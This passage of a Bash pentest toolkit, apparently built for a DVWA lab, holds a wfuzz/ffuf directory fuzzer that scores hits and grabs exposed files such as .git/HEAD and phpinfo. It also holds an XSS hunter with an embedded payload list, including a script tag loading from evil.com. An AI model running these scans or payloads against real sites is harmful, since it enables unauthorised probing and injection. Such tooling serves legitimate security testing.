    SCORED="$OUT_DIR/wfuzz_scored.txt"
    SUMMARY_CSV="$OUT_DIR/wfuzz_summary_${TIMESTAMP}.csv"
    SMART_SUM="$OUT_DIR/summary_report.txt"

    # check tools
    HAS_WFUZZ=0; HAS_FFUF=0
    if command -v wfuzz >/dev/null 2>&1; then HAS_WFUZZ=1; fi
    if command -v ffuf >/dev/null 2>&1; then HAS_FFUF=1; fi

    if [ $HAS_WFUZZ -eq 0 ] && [ $HAS_FFUF -eq 0 ]; then
        echo -e "${RED}‚ùå ni wfuzz ni ffuf introuvable. Installe au moins l'un des deux.${NC}"
        read -p "üëâ Entr√©e pour revenir..."
        return 1
    fi

    # helpers for parsing/scoring
    _score_line() {
        # input: status,size,duration,url,payload
        # scoring logic (modifiable): weight_status + size/500 + (if duration present add)
        local status=$1; local size=$2; local dur=$3; local url=$4; local payload=$5
        local w=0
        case "$status" in
            200) w=100 ;;
            20[1-9]) w=90 ;;
            30[0-9]) w=60 ;;
            403) w=30 ;;
            401) w=20 ;;
            404) w=5 ;;
            *) w=10 ;;
        esac
        # add size contribution (normalized)
        if [ -n "$size" ] && [ "$size" -gt 0 ] 2>/dev/null; then
            local s=$(( size / 500 ))
            w=$(( w + s ))
        fi
        # shorter duration is slightly better: invert dur (ms) -> add up to 20
        if [ -n "$dur" ] && awk 'BEGIN{exit(ARGC==2?0:1)}' "$dur" >/dev/null 2>&1; then
            # if dur numeric:
            if printf "%s" "$dur" | grep -Eq '^[0-9]+([.][0-9]+)?$'; then
                local idur=$(printf "%.0f" "$dur" 2>/dev/null)
                local dscore=$(( 20 - idur / 100 ))
                if [ $dscore -lt 0 ]; then dscore=0; fi
                w=$(( w + dscore ))
            fi
        fi
        printf "%d,%s,%s,%s,%s\n" "$w" "$status" "$size" "$url" "$payload"
    }

    # run wfuzz (CSV strict output) with streaming to file & optional live display
    run_wfuzz() {
        if [ $HAS_WFUZZ -eq 1 ] && { [ "$WANT_WFUZZ" = "Y" ] || [ "$WANT_WFUZZ" = "y" ] || [ -z "$WANT_WFUZZ" ]; }; then
            echo -e "${YELLOW}‚ñ∂ Lancement wfuzz (CSV strict, threads=${THREADS})...${NC}"
            # build hc option
            local hc_flags="--hc ${HC_LIST}"
            # try to force file output via -f (wfuzz accepts -f <file>,<format>)
            # We will capture both stdout (for live) and the file content.
            # Use "--format" or "-f" depending on wfuzz version; try -f first.
            # Compose a safe quoted filename for wfuzz -f
            local farg="${WFUZZ_RAW_CSV},csv"
            # run wfuzz, capture stdout to WFUZZ_RAW_TXT and ensure file written
            if [ "$STREAMING" = "Y" ] || [ "$STREAMING" = "y" ]; then
                # stream: show live stdout while saving
                # note: some wfuzz versions print tables to stdout; we just tee to file
                ( wfuzz -u "${TARGET}FUZZ" -w "$WORDLIST" -t "$THREADS" $hc_flags -f "$farg" 2>&1 | tee "$WFUZZ_RAW_TXT" ) || true
            else
                # quiet run (stdout -> file)
                ( wfuzz -u "${TARGET}FUZZ" -w "$WORDLIST" -t "$THREADS" $hc_flags -f "$farg" > "$WFUZZ_RAW_TXT" 2>&1 ) || true
            fi
            # If wfuzz wrote CSV via -f, ensure file exists
            [ -f "$WFUZZ_RAW_CSV" ] || touch "$WFUZZ_RAW_CSV"
            echo -e "${GREEN}‚úÖ wfuzz termin√© ‚Äî CSV g√©n√©r√© : ${WFUZZ_RAW_CSV}${NC}"
        else
            echo -e "${YELLOW}‚ñ∂ wfuzz non lanc√© (inexistant ou d√©sactiv√©).${NC}"
        fi
    }

    # run ffuf fallback (csv)
    run_ffuf() {
        if [ $HAS_FFUF -eq 1 ] && { [ "$WANT_FFUF" = "Y" ] || [ "$WANT_FFUF" = "y" ] || [ "$WANT_FFUF" = "Y" ] ; }; then
            echo -e "${YELLOW}‚ñ∂ Lancement ffuf (fallback/optional)...${NC}"
            # ffuf CSV columns: "url","status","size","words","lines","duration"
            ffuf -u "${TARGET}FUZZ" -w "$WORDLIST" -t "$THREADS" -mc all -of csv -o "$FFUF_RAW_CSV" > "$FFUF_RAW_MD" 2>&1 || true
            [ -f "$FFUF_RAW_CSV" ] || touch "$FFUF_RAW_CSV"
            echo -e "${GREEN}‚úÖ ffuf termin√© ‚Äî CSV: ${FFUF_RAW_CSV}${NC}"
        else
            echo -e "${YELLOW}‚ñ∂ ffuf non lanc√© (inexistant ou d√©sactiv√©).${NC}"
        fi
    }

    # parsing functions (best-effort robust)
    parse_wfuzz_csv() {
        # Several wfuzz versions produce CSV with columns like:
        # status,fullurl,payload  OR  id,response,lines,words,chars,payload
        # We'll try to detect and normalize to: status,size,duration,url,payload
        > "$CLEAN"
        if [ -s "$WFUZZ_RAW_CSV" ]; then
            # attempt 1: lines like STATUS,URL,PAYLOAD
            if awk -F',' 'NR==1{ if ($1 ~ /^[0-9]{3}$/) {print "ok1"; exit} }' "$WFUZZ_RAW_CSV" 2>/dev/null | grep -q ok1; then
                awk -F',' '{ status=$1; url=$2; payload=$3; gsub(/^[ \t]+|[ \t]+$/,"",payload); print status","url","payload }' "$WFUZZ_RAW_CSV" >> "$CLEAN" 2>/dev/null || true
            else
                # attempt 2: wfuzz verbose CSV that includes ID + Response + Lines + Word + Chars + Payload
                # example header not always present; detect lines with "Response" or numeric ID at start
                awk -F',' '
                    {
                      # remove leading/trailing whitespace and quotes
                      gsub(/^"|"$/,"",$0)
                      if (NF>=6 && $2 ~ /^[0-9]{3}$/) {
                        status=$2; size=$5; url=$6; payload=$6; # fallback
                      } else if (NF>=6 && $1 ~ /^[0-9]+$/ && $2 ~ /^[0-9]{3}$/) {
                        status=$2; size=$5; payload=$6; url=$6;
                      } else {
                        # fallback: try to parse "ID:   302 ... \"payload\""
                        status="UNK"; payload=$0; url="";
                      }
                      print status","url","payload
                    }' "$WFUZZ_RAW_CSV" >> "$CLEAN" 2>/dev/null || true
            fi
        fi
    }

    parse_wfuzz_txt_fallback() {
        # parse wfuzz textual summary (table output) saved in WFUZZ_RAW_TXT
        # extract lines like: 000000009:   200        1 L      2 W        23 Ch       ".git/HEAD"
        if [ -s "$WFUZZ_RAW_TXT" ]; then
            awk 'match($0, /[0-9]+\:[[:space:]]+([0-9A-Z]+)[^"]*"([^"]+)"/,m) { status=m[1]; payload=m[2]; print status","payload }' "$WFUZZ_RAW_TXT" >> "$CLEAN" 2>/dev/null || true
            # also try to catch single-line csv-like outputs
            grep -E '^[0-9]{3},' "$WFUZZ_RAW_TXT" >> "$CLEAN" 2>/dev/null || true
        fi
    }

    parse_ffuf_csv() {
        # ffuf CSV header maybe: "url","status","size","words","lines","duration"
        if [ -s "$FFUF_RAW_CSV" ]; then
            awk -F',' 'BEGIN{OFS=","} NR>1 {
                # remove surrounding quotes
                for(i=1;i<=NF;i++){ gsub(/^"|"$/,"",$i) }
                url=$1; status=$2; size=$3; dur=$6; payload=$1;
                print status","size","dur","url",payload
            }' "$FFUF_RAW_CSV" >> "$CLEAN" 2>/dev/null || true
        fi
    }

    # normalize CLEAN into PATHS_CSV with columns: status,size,duration,url,payload
    normalize_clean_to_paths() {
        > "$PATHS_CSV"
        if [ -s "$CLEAN" ]; then
            while IFS= read -r line; do
                # try multiple patterns
                # pattern 1: status,url,payload
                if echo "$line" | grep -Eq '^[0-9]{3},'; then
                    # try to split by commas safely
                    status=$(printf "%s" "$line" | cut -d',' -f1)
                    url=$(printf "%s" "$line" | cut -d',' -f2- | sed 's/,[^,]*$//')
                    payload=$(printf "%s" "$line" | awk -F',' '{print $NF}')
                    # size/dur unknown => set 0
                    printf "%s,%s,%s,%s,%s\n" "$status" "0" "0" "$url" "$payload" >> "$PATHS_CSV"
                else
                    # unknown pattern: put as UNK with payload
                    status=$(printf "%s" "$line" | awk -F',' '{print $1}')
                    rest=$(printf "%s" "$line" | cut -d',' -f2-)
                    printf "%s,%s,%s,%s,%s\n" "$status" "0" "0" "$rest" "$rest" >> "$PATHS_CSV"
                fi
            done < "$CLEAN"
        fi
    }

    # produce scored file (score,status,size,url,payload) and top sorted
    produce_scored() {
        > "$SCORED"
        if [ -s "$PATHS_CSV" ]; then
            while IFS= read -r l; do
                status=$(printf "%s" "$l" | cut -d',' -f1)
                size=$(printf "%s" "$l" | cut -d',' -f2)
                dur=$(printf "%s" "$l" | cut -d',' -f3)
                url=$(printf "%s" "$l" | cut -d',' -f4- | sed 's/,[^,]*$//')
                payload=$(printf "%s" "$l" | awk -F',' '{print $NF}')
                _score_line "$status" "$size" "$dur" "$url" "$payload"
            done < "$PATHS_CSV" | sort -t, -k1,1nr > "$SCORED"
        fi
    }

    # add to combined_paths if requested
    add_to_combined() {
        if [ "$ADD_TO_COMBINED" = "y" ] || [ "$ADD_TO_COMBINED" = "Y" ]; then
            COMBINED_DEFAULT="${LOG_DIR}/dirb/combined_paths.txt"
            : "${COMBINED:=$COMBINED_DEFAULT}"
            mkdir -p "$(dirname "$COMBINED")"
            # extract url (4th col)
            if [ -s "$PATHS_CSV" ]; then
                awk -F',' '{print $4}' "$PATHS_CSV" | sed '/^$/d' >> "$COMBINED"
                sort -u -o "$COMBINED" "$COMBINED"
                echo -e "${CYAN}‚ûï R√©sultats ajout√©s √† : ${COMBINED}${NC}"
            fi
        fi
    }

    # attempt to download interesting items
    download_interesting() {
        # check for robots, phpinfo, .git/HEAD, favicon, php.ini in PATHS_CSV or SCORED top lines
        local trylist
        trylist=$(awk -F',' '{
            l=tolower($4);
            if (l ~ /robots.txt/ || l ~ /phpinfo/ || l ~ /\.git\/HEAD/ || l ~ /favicon.ico/ || l ~ /php.ini/) print $4
        }' "$PATHS_CSV" | sort -u)
        for p in $trylist; do
            # build target path (strip domain if present)
            # if it's full URL, use it; otherwise append to TARGET
            if printf "%s" "$p" | grep -q '^http'; then
                url="$p"
            else
                url="${TARGET%/}/$(echo "$p" | sed 's#^/+##')"
            fi
            case "$p" in
                *robots.txt*) echo -e "${YELLOW}‚ñ∂ Extraction robots.txt / sauvegarde${NC}"
                              curl -sSL --max-time 10 "$url" -o "$OUT_DIR/robots.txt" || true ;;
                *phpinfo*)    echo -e "${YELLOW}‚ñ∂ Tentative sauvegarde phpinfo${NC}"
                              curl -sSL --max-time 10 "$url" -o "$OUT_DIR/phpinfo.html" || true ;;
                *.git/HEAD*|*.git/HEAD) echo -e "${YELLOW}‚ñ∂ .git/HEAD trouv√© ‚Äî tentative de r√©cup√©ration${NC}"
                              curl -sSL --max-time 10 "$url" -o "$OUT_DIR/git_HEAD" || true ;;
                *favicon.ico*) curl -sSL --max-time 10 "$url" -o "$OUT_DIR/favicon.ico" || true ;;
                *php.ini*)     curl -sSL --max-time 10 "$url" -o "$OUT_DIR/php.ini" || true ;;
                *) ;; 
            esac
        done
    }

    # --- Execution flow ---
    run_wfuzz

    # if wfuzz produced nothing useful and ffuf available & desired, run ffuf
    # decide if wfuzz csv empty or absent -> fallback
    if [ ! -s "$WFUZZ_RAW_CSV" ] && [ $HAS_FFUF -eq 1 ] && { [ "$WANT_FFUF" = "Y" ] || [ "$WANT_FFUF" = "y" ] || [ "$WANT_FFUF" = "Y" ]; }; then
        echo -e "${YELLOW}‚ö†Ô∏è wfuzz n'a pas produit de CSV parsable ‚Äî fallback vers ffuf${NC}"
        run_ffuf
    fi

    # parsing: prefer wfuzz CSV, but also try wfuzz text fallback and ffuf CSV
    > "$CLEAN"
    if [ -s "$WFUZZ_RAW_CSV" ]; then
        parse_wfuzz_csv
    fi
    # always try textual fallback (adds more)
    if [ -s "$WFUZZ_RAW_TXT" ]; then
        parse_wfuzz_txt_fallback
    fi
    # parse ffuf csv if present
    if [ -s "$FFUF_RAW_CSV" ]; then
        parse_ffuf_csv
    fi

    # normalize parsed results into a canonical CSV
    normalize_clean_to_paths

    # produce scoring
    produce_scored

    # produce smart summary & top N (10)
    {
        echo "=== Smart summary wfuzz/ffuf ($(date)) ==="
        echo "Target: $TARGET"
        echo
        echo "Top hits (scored):"
        if [ -s "$SCORED" ]; then
            head -n 10 "$SCORED" | nl -v1 -w2 -s' | ' | sed 's/,/ | /g'
        else
            echo "  (aucun hit scor√©)"
        fi
        echo
        echo "Stats summary:"
        if [ -s "$PATHS_CSV" ]; then
            awk -F',' '{cnt[$1]++} END { for (s in cnt) printf "%8s %6d\n", s, cnt[s] }' "$PATHS_CSV" | sort -nr -k2
        else
            echo "  (aucune donn√©e pars√©e)"
        fi
    } > "$SMART_SUM"

    # write summary CSV (simple metrics)
    TOTAL_PARSED=$(wc -l < "$PATHS_CSV" 2>/dev/null || echo 0)
    TOTAL_SCORed=$(wc -l < "$SCORED" 2>/dev/null || echo 0)
    {
        echo "timestamp,target,wfuzz_csv,ffuf_csv,parsed_paths,scored_hits,log_dir"
        echo "\"$TIMESTAMP\",\"$TARGET\",\"$WFUZZ_RAW_CSV\",\"$FFUF_RAW_CSV\",\"$TOTAL_PARSED\",\"$TOTAL_SCORed\",\"$OUT_DIR\""
    } > "$SUMMARY_CSV"

    # add to combined paths if requested
    add_to_combined

    # try to download interesting files
    download_interesting

    # final terminal summary (pretty)
    echo
    echo -e "${CYAN}üìä R√©sum√© des r√©sultats wfuzz/ffuf :${NC}"
    echo
    echo -e "‚Ä¢ Dossier : ${OUT_DIR}"
    echo -e "‚Ä¢ wfuzz CSV : ${WFUZZ_RAW_CSV} ($( [ -s "$WFUZZ_RAW_CSV" ] && echo "$(wc -l < "$WFUZZ_RAW_CSV") lines" || echo "absent" ))"
    echo -e "‚Ä¢ wfuzz raw : ${WFUZZ_RAW_TXT} ($( [ -s "$WFUZZ_RAW_TXT" ] && echo "present" || echo "absent" ))"
    echo -e "‚Ä¢ ffuf CSV  : ${FFUF_RAW_CSV} ($( [ -s "$FFUF_RAW_CSV" ] && echo "$(wc -l < "$FFUF_RAW_CSV") lines" || echo "absent" ))"
    echo
    echo -e "‚Ä¢ Parsed clean file : ${CLEAN} ($( [ -s "$CLEAN" ] && echo "$(wc -l < "$CLEAN") results" || echo "0" ))"
    echo -e "‚Ä¢ Paths CSV         : ${PATHS_CSV} ($( [ -s "$PATHS_CSV" ] && echo "$(wc -l < "$PATHS_CSV")" || echo "0" ))"
    echo -e "‚Ä¢ Scored (sorted)   : ${SCORED} ($( [ -s "$SCORED" ] && echo "$(wc -l < "$SCORED")" || echo "0" ))"
    echo -e "‚Ä¢ Smart summary     : ${SMART_SUM}"
    echo -e "‚Ä¢ R√©sum√© CSV        : ${SUMMARY_CSV}"
    echo
    if [ -s "$SCORED" ]; then
        echo -e "‚Ä¢ Top 10 hits (scored) :"
        head -n 10 "$SCORED" | awk -F',' '{ printf "  ‚Ä¢ %3d | %s | %s\n", $1, $2, $4 }'
    else
        echo "‚Ä¢ Aucun hit scor√©."
    fi
    echo

    # show saved special files
    echo -e "‚ñ∂ Fichiers r√©cup√©r√©s (si pr√©sents) :"
    [ -f "$OUT_DIR/robots.txt" ] && echo "  ‚Ä¢ robots.txt -> $OUT_DIR/robots.txt"
    [ -f "$OUT_DIR/phpinfo.html" ] && echo "  ‚Ä¢ phpinfo -> $OUT_DIR/phpinfo.html"
    [ -f "$OUT_DIR/git_HEAD" ] && echo "  ‚Ä¢ .git/HEAD -> $OUT_DIR/git_HEAD"
    [ -f "$OUT_DIR/favicon.ico" ] && echo "  ‚Ä¢ favicon.ico -> $OUT_DIR/favicon.ico"
    [ -f "$OUT_DIR/php.ini" ] && echo "  ‚Ä¢ php.ini -> $OUT_DIR/php.ini"
    echo

    echo -e "${GREEN}‚úÖ Fuzzing termin√©.${NC}"
    echo -e "üîé Logs complets : $OUT_DIR"
    echo -e "‚úÖ R√©sum√© sauvegard√© : $SUMMARY_CSV"
    read -p "üëâ Entr√©e pour revenir..."
}


###################################################################################################


exploit_xss() {
    clear; banner 2>/dev/null || true

    echo -e "${MAGENTA}üß™ [XSS Hunting - ultimate]${NC}"
    echo "üìñ Objectif : d√©tecter XSS r√©fl√©chis / basiques (et encod√©s)"
    echo "‚ö†Ô∏è Ex√©cuter uniquement sur cibles autoris√©es"
    echo

    # defaults
    DEFAULT_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
    read -p "üåê H√¥te/IP cible (default: ${DEFAULT_IP}): " TARGET_IP
    TARGET_IP=${TARGET_IP:-$DEFAULT_IP}
    read -p "üîå Port (default: 8081): " PORT
    PORT=${PORT:-8081}
    read -p "üìÅ Path de d√©part (default: /): " START_PATH
    START_PATH=${START_PATH:-/}

    read -p "üîó URL compl√®te √† tester (laisser vide pour discovery/base): " FULL_URL
    # base target
    BASE="http://${TARGET_IP}:${PORT}${START_PATH}"
    if [ -n "$FULL_URL" ]; then
        TARGET_URL="$FULL_URL"
    else
        TARGET_URL="$BASE"
    fi

    # locations
    : "${LOG_DIR:=${HOME}/ghost00ls/logs/dvwa_exploits}"
    TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
    OUT_DIR="$LOG_DIR/xss/$TIMESTAMP"
    mkdir -p "$OUT_DIR" 2>/dev/null || true

    # wordlist default and local fallback
    DEFAULT_PW="/usr/share/wordlists/xss_payloads.txt"
    read -p "üìÇ Wordlist payloads (default: ${DEFAULT_PW}): " PWFILE
    PWFILE=${PWFILE:-$DEFAULT_PW}

    # ensure local wordlist exists if system one not readable
    if [ ! -r "$PWFILE" ]; then
        echo -e "${YELLOW}‚ö†Ô∏è Wordlist XSS introuvable ou non lisible: $PWFILE${NC}"
        mkdir -p "${HOME}/ghost00ls/wordlists" 2>/dev/null || true
        PWFILE="${HOME}/ghost00ls/wordlists/xss_payloads.txt"
        if [ ! -f "$PWFILE" ]; then
            cat > "$PWFILE" <<'EOP'
# === Basic Reflection Payloads ===
<script>alert(1)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
"><svg/onload=alert(1)>
<svg/onload=confirm(1)>
"><iframe src=javascript:alert(1)>
"><body onload=alert(1)>

# === Encoded Versions ===
%3Cscript%3Ealert(1)%3C/script%3E
%22%3E%3Cscript%3Ealert(1)%3C/script%3E
%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
%3Csvg/onload%3Dalert(1)%3E
%22%3E%3Ciframe%20src%3Djavascript%3Aalert(1)%3E
%22%3E%3Cbody%20onload%3Dalert(1)%3E

# === Event Handler Payloads ===
"><img src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
<a href="javascript:alert(1)">Click</a>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<svg><script>alert(1)</script></svg>

# === Attribute Injections ===
"><svg/onmouseover=alert(1)>
<IMG SRC="javascript:alert('XSS')">
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=`javascript:alert(1)`>
"><input autofocus onfocus=alert(1)>
"><button onclick=alert(1)>Click</button>

# === Filter Evasion / HTML Entities ===
&lt;script&gt;alert(1)&lt;/script&gt;
&quot;&gt;&lt;svg/onload=alert(1)&gt;
&apos;&gt;&lt;img src=x onerror=alert(1)&gt;

# === Polyglot & Obfuscated ===
jaVasCript:alert(1)
"><sCript>alert(1)</sCript>
%EF%BB%BF<script>alert(1)</script>
"><script/src=//evil.com/xss.js>
--><script>alert(1)</script>
</script><script>alert(1)</script>
"><math href="javascript:alert(1)">CLICK</math>
"><object data="javascript:alert(1)">
<embed src="data:text/html,<script>alert(1)</script>">
EOP
            echo -e "${GREEN}‚Üí Wordlist locale XSS √©tendue cr√©√©e: ${PWFILE}${NC}"
        else
            echo -e "${YELLOW}‚Üí Utilisation de la wordlist locale existante: ${PWFILE}${NC}"
        fi
    else
        echo -e "${GREEN}‚Üí Utilisation de la wordlist: ${PWFILE}${NC}"
    fi

    # ffuf params
    read -p "‚öôÔ∏è Threads / parallel ffuf (default: 20): " FTHREADS
    FTHREADS=${FTHREADS:-20}

    # streaming default yes
    read -p "‚ñ∂ Mode streaming (afficher hits en direct) ? [Y/n]: " STREAM
    STREAM=${STREAM:-Y}
    if [[ "$STREAM" =~ ^([yY]) ]]; then STREAM=1; else STREAM=0; fi

    read -p "‚ñ∂ Lancer ffuf pour fuzz XSS (injection param 'test') ? [y/N]: " RUN_FFUFF
    RUN_FFUFF=${RUN_FFUFF:-N}
    if [[ "$RUN_FFUFF" =~ ^([yY]) ]]; then RUN_FFUFF=1; else RUN_FFUFF=0; fi

    read -p "‚ñ∂ Lancer discovery de param√®tres (ffuf) avant tests ? [y/N]: " DISCOVER_PARAMS
    DISCOVER_PARAMS=${DISCOVER_PARAMS:-N}
    if [[ "$DISCOVER_PARAMS" =~ ^([yY]) ]]; then DISCOVER_PARAMS=1; else DISCOVER_PARAMS=0; fi

    read -p "‚ûï Ajouter r√©sultats au combined_paths (si pr√©sent) ? [y/N]: " ADD_COMBINED
    ADD_COMBINED=${ADD_COMBINED:-N}
    if [[ "$ADD_COMBINED" =~ ^([yY]) ]]; then ADD_COMBINED=1; else ADD_COMBINED=0; fi

    # prepare logs
    RAW_LOG="$OUT_DIR/xss_raw.txt"
    FFUF_LOG="$OUT_DIR/xss_ffuf.csv"
    PATHS_CSV="$OUT_DIR/xss_paths.csv"
    CLEAN="$OUT_DIR/xss_clean.txt"
    SCORED="$OUT_DIR/xss_scored.txt"
    SUMMARY_CSV="$OUT_DIR/xss_summary_${TIMESTAMP}.csv"
    echo "=== XSS RAW LOG for $TARGET_URL ($TIMESTAMP) ===" > "$RAW_LOG"

    echo
    echo -e "${CYAN}‚ñ∂ Cible : ${TARGET_URL}${NC}"
    echo -e "${CYAN}‚ñ∂ Payloads : ${PWFILE}${NC}"
    echo

    # helper: try to download interesting files discovered later
    try_downloads() {
        local base="$1"
        [ -f "$OUT_DIR/robots.txt" ] || curl -sSL --max-time 10 "${base%/}/robots.txt" -o "$OUT_DIR/robots.txt" || true
        [ -f "$OUT_DIR/phpinfo.html" ] || curl -sSL --max-time 10 "${base%/}/phpinfo.php" -o "$OUT_DIR/phpinfo.html" || true
        [ -f "$OUT_DIR/git_HEAD" ] || curl -sSL --max-time 10 "${base%/}/.git/HEAD" -o "$OUT_DIR/git_HEAD" || true
        [ -f "$OUT_DIR/favicon.ico" ] || curl -sSL --max-time 10 "${base%/}/favicon.ico" -o "$OUT_DIR/favicon.ico" || true
        [ -f "$OUT_DIR/php.ini" ] || curl -sSL --max-time 10 "${base%/}/php.ini" -o "$OUT_DIR/php.ini" || true
    }

    # optional: discover parameters for endpoints (very basic using ffuf)
    PARAMS_FOUND=()
    if [ $DISCOVER_PARAMS -eq 1 ] && command -v ffuf >/dev/null 2>&1; then
        echo -e "${YELLOW}‚ñ∂ Discovery param√®tres (ffuf) sur la base...${NC}"
        TMP_PARAM_LOG="$OUT_DIR/params_ffuf.txt"
        # scan for common ?param= (simple heuristic: test a few known param names)
        COMMON_PARAMS="id,page,view,lang,cat,search,q,query,post,test"
        for p in $(echo $COMMON_PARAMS); do
            # use ffuf to inject into ?p=FUZZ - quick: we test small list of common words from payloads file head
            head -n 200 "$PWFILE" 2>/dev/null | awk 'NF' > "$OUT_DIR/tmp_param_candidates.txt"
            ffuf -u "${TARGET_URL}?${p}=FUZZ" -w "$OUT_DIR/tmp_param_candidates.txt" -t 10 -mc all -of md -o "$TMP_PARAM_LOG" >/dev/null 2>&1 || true
            if grep -q -E "Status: 2|Status: 3|Status: 4|Status: 5" "$TMP_PARAM_LOG" 2>/dev/null; then
                PARAMS_FOUND+=("$p")
            fi
        done
        rm -f "$OUT_DIR/tmp_param_candidates.txt"
        if [ ${#PARAMS_FOUND[@]} -gt 0 ]; then
            echo -e "${GREEN}‚Üí Param√®tres potentiels trouv√©s: ${PARAMS_FOUND[*]}${NC}"
        else
            echo -e "${YELLOW}‚Üí Aucun param√®tre obvious trouv√© via la heuristique.${NC}"
        fi
    fi

    # Main run: try ffuf fuzzing on param 'test' if requested
    if [ $RUN_FFUFF -eq 1 ] && command -v ffuf >/dev/null 2>&1; then
        echo -e "${YELLOW}‚ñ∂ Lancement ffuf pour XSS (param 'test')...${NC}"
        # write ffuf CSV
        ffuf -u "${TARGET_URL}?test=FUZZ" -w "$PWFILE" -t "$FTHREADS" -mc all -of csv -o "$FFUF_LOG" >/dev/null 2>&1 || true
        # capture verbose streaming if requested: tail CSV and print hits with color
        if [ $STREAM -eq 1 ]; then
            echo -e "${CYAN}-- Mode streaming (ffuf hits) --${NC}"
            # print any non-empty rows
            if [ -s "$FFUF_LOG" ]; then
                awk -F, 'NR>1 && NF>=5 { status=$2; size=$4; dur=$5; payload=$6; url=$3;
                    if(status ~ /^[23]/) col="\033[32m"; else if(status ~ /^4/) col="\033[33m"; else col="\033[36m";
                    printf("%s[%s] %s | %s | %s %s\033[0m\n", col, status, url, payload, size, dur)
                }' "$FFUF_LOG" | sed 's/\\r//g'
            else
                echo -e "${YELLOW}(ffuf: pas de hits d√©tect√©s ou log vide)${NC}"
            fi
        fi
        echo "FFUF_LOG:$FFUF_LOG" >> "$RAW_LOG"
    else
        if [ $RUN_FFUFF -eq 1 ]; then
            echo -e "${YELLOW}‚ö†Ô∏è ffuf non install√© ‚Äî on passera au fallback curl-based${NC}"
        fi
    fi

    # if ffuf produced CSV, try to parse strictly (status,fullurl,payload,size,time)
    PARSED=0
    if [ -f "$FFUF_LOG" ] && [ -s "$FFUF_LOG" ]; then
        # ffuf csv format: Keyword,Status,URL,Length,Words,Lines,Duration,Payload
        # but formats vary; try robust awk
        awk -F',' 'NR>1 && NF>=4 { gsub(/^[ \t]+|[ \t]+$/,"",$0); status=$2; url=$3; size=$4; dur=(NF>=7?$7:"0"); payload=$(NF);
            # remove leading/trailing quotes
            gsub(/^"|"$/,"",payload); gsub(/^"|"$/,"",url);
            print status","url","size","dur","payload
        }' "$FFUF_LOG" 2>/dev/null > "$OUT_DIR/xss_ffuf_parsed.csv" || true

        if [ -s "$OUT_DIR/xss_ffuf_parsed.csv" ]; then
            mv "$OUT_DIR/xss_ffuf_parsed.csv" "$PATHS_CSV" 2>/dev/null || cp -f "$OUT_DIR/xss_ffuf_parsed.csv" "$PATHS_CSV" 2>/dev/null || true
            PARSED=1
        fi
    fi

    # If ffuf failed or produced nothing, fallback to curl-based test (safe, reflection check)
    if [ $PARSED -eq 0 ]; then
        echo -e "${YELLOW}‚ñ∂ Mode fallback : test de r√©flexion via curl (payloads)...${NC}"
        > "$CLEAN"
        # iterate payloads and request GET param 'test' (safe)
        n=0
        while IFS= read -r payload || [ -n "$payload" ]; do
            # skip comments/empty lines
            case "$payload" in
                ''|\#*) continue ;;
            esac
            n=$((n+1))
            enc=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || printf '%s' "$(printf %s "$payload" | jq -s -R -r @uri 2>/dev/null)" )
            url="${TARGET_URL}?test=${enc}"
            start=$(date +%s%3N)
            # follow redirects to capture real status/size/time
            resp=$(curl -sS -L -w "XXX%{http_code},%{size_download},%{time_total}" -o /tmp/xss_body.$$ "$url" 2>/dev/null) || resp="XXX000"
            end=$(date +%s%3N)
            # parse resp
            if echo "$resp" | grep -q '^XXX'; then
                info=$(echo "$resp" | sed 's/^XXX//')
                status=$(echo "$info" | cut -d',' -f1)
                size=$(echo "$info" | cut -d',' -f2)
                time=$(echo "$info" | cut -d',' -f3)
            else
                status="UNK"; size=0; time=0
            fi
            # check if payload reflected in body (raw or decoded)
            body=$(cat /tmp/xss_body.$$ 2>/dev/null || true)
            reflected=0
            # naive reflection check: presence of payload or unquoted version
            if [ -n "$body" ] && ( echo "$body" | grep -F -q "$payload" 2>/dev/null || echo "$body" | grep -F -q "$(python3 -c "import html,sys;print(html.unescape(sys.argv[1]))" "$payload" 2>/dev/null)" ); then
                reflected=1
            fi
            # Score: higher for 2xx and reflection, also advantage to bigger size/time anomalies
            score=0
            case "$status" in
                200) score=$((score+80)) ;;
                301|302|303|307) score=$((score+40)) ;;
                403) score=$((score+30)) ;;
                404) score=$((score+0)) ;;
                *) score=$((score+10)) ;;
            esac
            if [ "$reflected" -eq 1 ]; then score=$((score+100)); fi
            # size bonus if > 1000
            if [ "$size" -ge 1000 ]; then score=$((score+20)); fi
            # write to clean log & summary
            printf "%s,%s,%s,%s,%s,%s\n" "$n" "$status" "$size" "$time" "$(echo "$payload" | sed 's/,/ /g')" "$url" >> "$CLEAN"
            printf "%s | %s | %s | %s | %s\n" "$score" "$status" "$size" "$(printf '%.3f' "$time")" "$url" >> "$SCORED"
            if [ $STREAM -eq 1 ]; then
                if [ "$reflected" -eq 1 ]; then
                    echo -e "${RED}[HIT][score:$score] $status | ${size}B | ${time}s | ${url}${NC}"
                else
                    echo -e "${YELLOW}[MISS][score:$score] $status | ${size}B | ${time}s | ${url}${NC}"
                fi
            fi
        done < "$PWFILE"
        rm -f /tmp/xss_body.$$ 2>/dev/null || true
    fi

    # final scoring & sorting
    if [ -f "$SCORED" ]; then
        sort -nrk1 "$SCORED" | uniq > "$SCORED.sorted"
        mv "$SCORED.sorted" "$SCORED"
    fi

    # create summary csv
    {
        echo "timestamp,target,raw_log,clean_hits,scored,paths_csv,out_dir"
        echo "\"$TIMESTAMP\",\"$TARGET_URL\",\"$RAW_LOG\",\"$CLEAN\",\"$SCORED\",\"$PATHS_CSV\",\"$OUT_DIR\""
    } > "$SUMMARY_CSV"

    # attempt downloads if high-priority items found in scored top (phpinfo, robots, .git/HEAD, favicon, php.ini)
    # simple grep for names in CLEAN/SCORED
    if grep -q -E "phpinfo|php.ini|robots.txt|\.git/HEAD|favicon.ico" "$CLEAN" 2>/dev/null || grep -q -E "phpinfo|php.ini|robots.txt|\.git/HEAD|favicon.ico" "$SCORED" 2>/dev/null; then
        echo -e "${YELLOW}‚ñ∂ Tentative t√©l√©chargement des items int√©ressants...${NC}"
        try_downloads "$BASE"
    fi

    # optionally add found paths to combined_paths
    if [ $ADD_COMBINED -eq 1 ] && [ -f "$CLEAN" ]; then
